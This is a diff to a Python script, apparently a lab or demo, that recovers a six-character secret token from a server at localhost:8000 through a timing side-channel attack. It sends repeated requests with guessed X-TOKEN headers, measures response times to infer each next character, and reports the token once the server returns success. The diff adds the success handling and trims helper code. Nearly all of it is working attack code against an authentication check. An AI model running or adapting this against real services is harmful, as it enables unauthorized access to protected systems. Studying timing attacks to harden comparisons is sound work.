@@ -1,13 +1,21 @@
+import sys
 import time
 import string
-import requests
 import statistics
+
+import requests
 
 from operator import itemgetter
 
 URL = "http://localhost:8000"
-N = 1000
+N = 100
 TOKEN_SIZE = 6
+
+
+class PasswordFound(Exception):
+
+    def __init__(self, password):
+        self.password = password
 
 
 def try_to_hack(characters):
@@ -22,30 +30,14 @@ def try_to_hack(characters):
         result = requests.get(URL, headers={'X-TOKEN': basic_auth})
         after = time.perf_counter()
 
-        if result.status_code != 403:
-            raise Exception(result, result.status_code)
-        elif result.status_code == 200:
+        if result.status_code == 200:
+            raise PasswordFound(basic_auth)
+        elif result.status_code != 403:
             raise Exception(result, result.status_code)
 
         timings.append(after - before)
 
     return timings
-
-
-def remove_outliers(distribution):
-    mean = statistics.mean(distribution)
-    stddev = statistics.stdev(distribution)
-
-    return [x for x in distribution if (mean - 2*stddev) < x < (mean + 2*stddev)]
-
-
-def do_a_call(characters):
-    # Add an invalid character
-    basic_auth = characters + "+"
-    result = requests.get(URL, headers={'X-TOKEN': basic_auth})
-
-    if result.status_code != 403:
-            raise Exception(result, result.status_code)
 
 
 def find_next_character(base):
@@ -86,11 +78,20 @@ def main():
 
     base = ''
 
-    while len(base) != TOKEN_SIZE:
-        next_character = find_next_character(base)
-        base += next_character
+    try:
+        while len(base) != TOKEN_SIZE:
+            next_character = find_next_character(base)
+            base += next_character
+            print()
+            print()
+    except PasswordFound as e:
         print()
         print()
+        print("The token is: %r %s" % (e.password, '!'*10))
+        sys.exit(0)
+    else:
+        print("The password is not found, check the allowed character and token size")
+        sys.exit(1)
 
 
 
